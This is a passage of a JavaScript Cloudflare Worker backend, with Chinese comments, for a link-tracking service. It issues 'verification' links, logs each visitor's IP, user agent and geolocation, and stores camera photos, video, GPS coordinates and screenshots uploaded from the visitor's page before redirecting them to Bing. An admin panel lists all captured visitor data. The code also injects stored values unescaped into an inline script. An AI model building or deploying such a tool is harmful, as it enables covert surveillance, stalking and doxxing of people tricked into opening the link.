    `).bind(
      id,
      ip,
      ua,
      Math.floor(Date.now() / 1000),
      redirectUrl || 'https://www.bing.com',
      requireLocation ? 1 : 0,
      requireScreenshot ? 1 : 0,
      maxVideoTime || 10
    ).run();
    
    return new Response(JSON.stringify({ 
      success: true, 
      id: id,
      link: `https://${DOMAIN}/${id}`
    }), {
      headers: { 'Content-Type': 'application/json' }
    });
    
  } catch (error) {
    return new Response(JSON.stringify({ 
      error: '生成失败: ' + error.message 
    }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' }
    });
  }
}

// 查询记录
async function handleQuery(id, env, request) {
  try {
    // 查询记录信息
    const record = await env.DB.prepare(`
      SELECT * FROM records WHERE id = ?
    `).bind(id).first();
    
    if (!record) {
      return new Response(JSON.stringify({ 
        error: '记录不存在' 
      }), {
        status: 404,
        headers: { 'Content-Type': 'application/json' }
      });
    }
    
    // 查询上传的文件
    const uploads = await env.DB.prepare(`
      SELECT * FROM uploads WHERE record_id = ? ORDER BY timestamp DESC
    `).bind(id).all();
    
    return new Response(JSON.stringify({ 
      success: true,
      record: record,
      uploads: uploads.results || []
    }), {
      headers: { 'Content-Type': 'application/json' }
    });
    
  } catch (error) {
    return new Response(JSON.stringify({ 
      error: '查询失败: ' + error.message 
    }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' }
    });
  }
}

// 处理访问
async function handleVisit(id, env, request) {
  try {
    // 获取访问者信息
    const ip = request.headers.get('CF-Connecting-IP') || 
               request.headers.get('X-Forwarded-For') || 
               'unknown';
    const ua = request.headers.get('User-Agent') || 'unknown';
    
    // 获取地理位置信息
    let geoInfo = {};
    try {
      const geoResponse = await fetch(`${GEO_API}?ip=${ip}`);
      geoInfo = await geoResponse.json();
    } catch (e) {
      console.warn('获取地理位置失败:', e);
    }
    
    // 更新访问计数
    await env.DB.prepare(`
      UPDATE records SET total_views = total_views + 1 WHERE id = ?
    `).bind(id).run();
    
    // 记录访问日志（可选）
    
    return new Response(JSON.stringify({ 
      success: true,
      geo: geoInfo
    }), {
      headers: { 'Content-Type': 'application/json' }
    });
    
  } catch (error) {
    return new Response(JSON.stringify({ 
      error: '记录访问失败: ' + error.message 
    }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' }
    });
  }
}

// 处理上传
async function handleUpload(request, env) {
  try {
    const formData = await request.formData();
    const file = formData.get('file');
    const type = formData.get('type');
    const recordId = formData.get('recordId');
    const latitude = formData.get('latitude');
    const longitude = formData.get('longitude');
    const screenshotUrl = formData.get('screenshotUrl');
    
    if (!file || !type || !recordId) {
      return new Response(JSON.stringify({ error: '缺少必要参数' }), {
        status: 400,
        headers: { 'Content-Type': 'application/json' }
      });
    }
    
    // 检查文件大小
    const fileSize = file.size;
    if (fileSize > MAX_FILE_SIZE) {
      return new Response(JSON.stringify({ error: '文件大小超过5MB限制' }), {
        status: 400,
        headers: { 'Content-Type': 'application/json' }
      });
    }
    
    // 获取访问者信息
    const ip = request.headers.get('CF-Connecting-IP') || 
               request.headers.get('X-Forwarded-For') || 
               'unknown';
    const ua = request.headers.get('User-Agent') || 'unknown';
    
    // 获取地理位置信息
    let geoInfo = {};
    try {
      const geoResponse = await fetch(`${GEO_API}?ip=${ip}`);
      geoInfo = await geoResponse.json();
    } catch (e) {
      console.warn('获取地理位置失败:', e);
    }
    
    // 生成文件名
    const timestamp = Date.now();
    const randomStr = Math.random().toString(36).substring(2, 15);
    const fileExt = type === 'photo' ? 'jpg' : type === 'video' ? 'webm' : 'bin';
    const fileName = `${timestamp}_${randomStr}.${fileExt}`;
    
    // 这里需要实现文件上传到您的tc.ilqx.dpdns.org
    // 由于Cloudflare Worker无法直接上传到外部服务器，
    // 这里我们假设有一个上传端点
    
    // 模拟上传成功，返回文件路径
    const fileUrl = `/file/${fileName}`;
    
    // 记录上传信息到数据库
    await env.DB.prepare(`
      INSERT INTO uploads 
      (record_id, visitor_ip, visitor_ua, visitor_country, visitor_city, 
       file_url, upload_type, timestamp, latitude, longitude, screenshot_data)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `).bind(
      recordId,
      ip,
      ua,
      geoInfo.country || '',
      geoInfo.city || '',
      fileUrl,
      type,
      Math.floor(Date.now() / 1000),
      latitude || null,
      longitude || null,
      screenshotUrl || ''
    ).run();
    
    return new Response(JSON.stringify({ 
      success: true,
      file_url: fileUrl,
      message: '上传成功'
    }), {
      headers: { 'Content-Type': 'application/json' }
    });
    
  } catch (error) {
    return new Response(JSON.stringify({ 
      error: '上传失败: ' + error.message 
    }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' }
    });
  }
}

// 管理员登录
async function handleAdminLogin(request, env) {
  try {
    const data = await request.json();
    const { username, password } = data;
    
    if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
      // 创建会话
      const sessionId = generateSessionId();
      const expiresAt = Math.floor(Date.now() / 1000) + (24 * 60 * 60); // 24小时
      const ip = request.headers.get('CF-Connecting-IP') || 'unknown';
      
      await env.DB.prepare(`
        INSERT INTO admin_sessions (session_id, admin_ip, expires_at)
        VALUES (?, ?, ?)
      `).bind(sessionId, ip, expiresAt).run();
      
      // 记录登录日志
      await env.DB.prepare(`
        INSERT INTO admin_logs (admin_ip, action, timestamp)
        VALUES (?, ?, ?)
      `).bind(ip, 'login', Math.floor(Date.now() / 1000)).run();
      
      return new Response(JSON.stringify({ 
        success: true,
        session: sessionId
      }), {
        headers: { 'Content-Type': 'application/json' }
      });
    } else {
      return new Response(JSON.stringify({ 
        error: '用户名或密码错误' 
      }), {
        status: 401,
        headers: { 'Content-Type': 'application/json' }
      });
    }
    
  } catch (error) {
    return new Response(JSON.stringify({ 
      error: '登录失败: ' + error.message 
    }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' }
    });
  }
}

// 管理员获取记录
async function handleAdminRecords(request, env) {
  try {
    const sessionId = request.headers.get('X-Session');
    
    // 验证会话
    const session = await env.DB.prepare(`
      SELECT * FROM admin_sessions 
      WHERE session_id = ? AND expires_at > ?
    `).bind(sessionId, Math.floor(Date.now() / 1000)).first();
    
    if (!session) {
      return new Response(JSON.stringify({ 
        error: '会话无效或已过期' 
      }), {
        status: 401,
        headers: { 'Content-Type': 'application/json' }
      });
    }
    
    // 获取所有记录
    const records = await env.DB.prepare(`
      SELECT r.*, COUNT(u.upload_id) as verification_count
      FROM records r
      LEFT JOIN uploads u ON r.id = u.record_id
      GROUP BY r.id
      ORDER BY r.created_at DESC
    `).all();
    
    // 获取所有文件
    const files = await env.DB.prepare(`
      SELECT u.*, r.creator_ip as record_creator_ip
      FROM uploads u
      LEFT JOIN records r ON u.record_id = r.id
      ORDER BY u.timestamp DESC
      LIMIT 100
    `).all();
    
    return new Response(JSON.stringify({ 
      success: true,
      records: records.results || [],
      files: files.results || []
    }), {
      headers: { 'Content-Type': 'application/json' }
    });
    
  } catch (error) {
    return new Response(JSON.stringify({ 
      error: '获取记录失败: ' + error.message 
    }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' }
    });
  }
}

// 删除记录
async function handleDeleteRecord(id, env, request) {
  try {
    const sessionId = request.headers.get('X-Session');
    
    // 验证会话
    const session = await env.DB.prepare(`
      SELECT * FROM admin_sessions 
      WHERE session_id = ? AND expires_at > ?
    `).bind(sessionId, Math.floor(Date.now() / 1000)).first();
    
    if (!session) {
      return new Response(JSON.stringify({ 
        error: '会话无效或已过期' 
      }), {
        status: 401,
        headers: { 'Content-Type': 'application/json' }
      });
    }
    
    // 删除记录和相关上传
    await env.DB.prepare('DELETE FROM uploads WHERE record_id = ?').bind(id).run();
    await env.DB.prepare('DELETE FROM records WHERE id = ?').bind(id).run();
    
    // 记录删除日志
    await env.DB.prepare(`
      INSERT INTO admin_logs (admin_ip, action, timestamp)
      VALUES (?, ?, ?)
    `).bind(session.admin_ip, `delete_record:${id}`, Math.floor(Date.now() / 1000)).run();
    
    return new Response(JSON.stringify({ 
      success: true,
      message: '删除成功'
    }), {
      headers: { 'Content-Type': 'application/json' }
    });
    
  } catch (error) {
    return new Response(JSON.stringify({ 
      error: '删除失败: ' + error.message 
    }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' }
    });
  }
}

// 管理员页面
async function handleAdminPage(request, env) {
  // 返回主页面，由前端JavaScript处理管理员登录
  return new Response(htmlTemplates.mainPage, {
    headers: {
      'Content-Type': 'text/html;charset=UTF-8'
    }
  });
}

// 验证页面
async function handleVerificationPage(request, env, id) {
  // 检查记录是否存在
  const record = await env.DB.prepare(`
    SELECT * FROM records WHERE id = ?
  `).bind(id).first();
  
  if (!record) {
    return new Response('验证链接不存在或已过期', {
      status: 404,
      headers: { 'Content-Type': 'text/html' }
    });
  }
  
  // 生成验证页面
  const verificationHTML = htmlTemplates.mainPage.replace(
    '<script>',
    `<script>
      // 验证页面特定配置
      window.verificationConfig = {
        recordId: '${id}',
        requireLocation: ${record.require_location || 0},
        requireScreenshot: ${record.require_screenshot || 0},
        maxVideoTime: ${record.max_video_time || 10},
        redirectUrl: '${record.custom_redirect || 'https://www.bing.com'}'
      };
      
      // 页面加载后立即显示验证页面
      document.addEventListener('DOMContentLoaded', function() {
        document.body.innerHTML = document.getElementById('verificationPage').innerHTML;
        initVerification();
      });
    </script>
    <script>`
  );
  
  return new Response(verificationHTML, {
    headers: {
      'Content-Type': 'text/html;charset=UTF-8'
    }
  });
}

// 生成会话ID
function generateSessionId() {
  return Array.from(crypto.getRandomValues(new Uint8Array(32)))
    .map(b => b.toString(16).padStart(2, '0'))
    .join('');
}